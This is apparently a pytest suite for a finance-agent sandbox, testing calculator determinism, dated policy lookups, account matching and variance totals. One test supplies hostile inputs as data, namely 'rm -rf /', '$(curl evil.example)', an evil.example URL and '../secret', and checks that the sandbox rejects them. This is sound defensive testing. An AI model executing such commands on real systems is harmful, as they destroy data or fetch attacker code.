"""Sandbox security, temporal, arithmetic, and accounting semantics."""

from __future__ import annotations

import pytest

from distillery.finance_agent.contracts import ToolName
from distillery.finance_agent.sandbox import (
    FinanceAgentSandbox,
    SandboxSecurityError,
)
from distillery.finance_agent.world import build_agent_world


def _sandbox(*, domain: str = "travel") -> tuple:
    world = build_agent_world(seed=7, index=2, domain=domain)
    return world, FinanceAgentSandbox(world, allowed_tools=tuple(ToolName))


@pytest.mark.parametrize(
    "arguments",
    [
        {"op": "add", "operands": [1, 2], "shell": "rm -rf /"},
        {"query": "https://evil.example"},
        {"query": "$(curl evil.example)"},
        {"query": "../secret"},
    ],
)
def test_sandbox_rejects_shell_network_and_path_escapes(arguments: dict) -> None:
    _, sandbox = _sandbox()
    tool = ToolName.CALCULATOR if "op" in arguments else ToolName.CHART_OF_ACCOUNTS_LOOKUP
    with pytest.raises(SandboxSecurityError):
        sandbox.execute(call_id="c1", tool=tool, arguments=arguments)


def test_calculator_is_deterministic_and_soft_fails_invalid_arity() -> None:
    _, sandbox = _sandbox()
    first = sandbox.execute(
        call_id="c1",
        tool=ToolName.CALCULATOR,
        arguments={"op": "add", "operands": [10, 20, 30]},
    )
    second = sandbox.execute(
        call_id="c2",
        tool=ToolName.CALCULATOR,
        arguments={"op": "add", "operands": [10, 20, 30]},
    )
    assert first.ok and second.ok
    assert first.result["result"] == second.result["result"] == 60
    invalid = sandbox.execute(
        call_id="c3",
        tool=ToolName.CALCULATOR,
        arguments={"op": "abs_diff", "operands": [1]},
    )
    assert invalid.ok is False
    assert invalid.error_code == "INVALID_ARGUMENTS"
    divide_by_zero = sandbox.execute(
        call_id="c4",
        tool=ToolName.CALCULATOR,
        arguments={"op": "pct_of", "operands": [1, 0]},
    )
    assert divide_by_zero.ok is False
    assert divide_by_zero.error_code == "DIVIDE_BY_ZERO"


def test_temporal_policy_lookup_returns_historically_effective_version() -> None:
    world, sandbox = _sandbox()
    policy_id = world.policies[-1].policy_id
    historical = sandbox.execute(
        call_id="c1",
        tool=ToolName.POLICY_LOOKUP,
        arguments={
            "policy_id": policy_id,
            "as_of": world.historical_policy_date,
            "include_history": False,
        },
    )
    current = sandbox.execute(
        call_id="c2",
        tool=ToolName.POLICY_LOOKUP,
        arguments={
            "policy_id": policy_id,
            "as_of": world.as_of,
            "include_history": False,
        },
    )
    assert historical.ok and historical.result["policy"]["version"] == "v1"
    assert historical.result["policy"]["superseded"] is True
    assert current.ok and current.result["policy"]["version"] == "v2"


def test_coa_code_and_query_are_both_required_to_match() -> None:
    _, sandbox = _sandbox()
    result = sandbox.execute(
        call_id="c1",
        tool=ToolName.CHART_OF_ACCOUNTS_LOOKUP,
        arguments={"query": "does not exist", "account_code": "6100"},
    )
    assert result.ok is False
    assert result.error_code == "NOT_FOUND"


def test_transaction_matching_rejects_duplicate_and_unknown_ids_softly() -> None:
    world, sandbox = _sandbox()
    book_id = world.book_entries[0].book_id
    bank_id = world.bank_events[0].bank_id
    duplicate = sandbox.execute(
        call_id="c1",
        tool=ToolName.TRANSACTION_MATCHING,
        arguments={
            "book_ids": [book_id, book_id],
            "bank_ids": [bank_id],
            "tolerance_minor": 0,
        },
    )
    assert duplicate.ok is False
    assert duplicate.error_code == "INVALID_ARGUMENTS"
    unknown = sandbox.execute(
        call_id="c2",
        tool=ToolName.TRANSACTION_MATCHING,
        arguments={
            "book_ids": ["bok_000000000000000000"],
            "bank_ids": [bank_id],
            "tolerance_minor": 0,
        },
    )
    assert unknown.ok is False
    assert unknown.error_code == "NOT_FOUND"


def test_variance_reports_full_total_not_only_top_k() -> None:
    world, sandbox = _sandbox()
    result = sandbox.execute(
        call_id="c1",
        tool=ToolName.VARIANCE_DRILL_DOWN,
        arguments={
            "account_code": world.accounts[0].code,
            "period": world.period,
            "top_k": 1,
        },
    )
    assert result.ok
    assert len(result.result["drivers"]) == 1
    expected_full = sum(driver.impact_minor for driver in world.variance_drivers)
    assert result.result["full_period_impact_minor"] == expected_full
    assert (
        result.result["returned_impact_minor"] + result.result["omitted_impact_minor"]
        == expected_full
    )


def test_payroll_changes_coa_ledger_policy_and_merchant_semantics() -> None:
    travel = build_agent_world(seed=11, index=1, domain="travel")
    payroll = build_agent_world(seed=11, index=1, domain="payroll")
    assert travel.accounts[0].code == "6100"
    assert payroll.accounts[0].code == "6400"
    assert payroll.ledger[0].account_code == "6400"
    assert "payroll" in payroll.ledger[0].memo
    assert payroll.policies[-1].policy_id == "pol_payroll_threshold"
    assert "Revenue Department" in payroll.merchants[0].legal_name
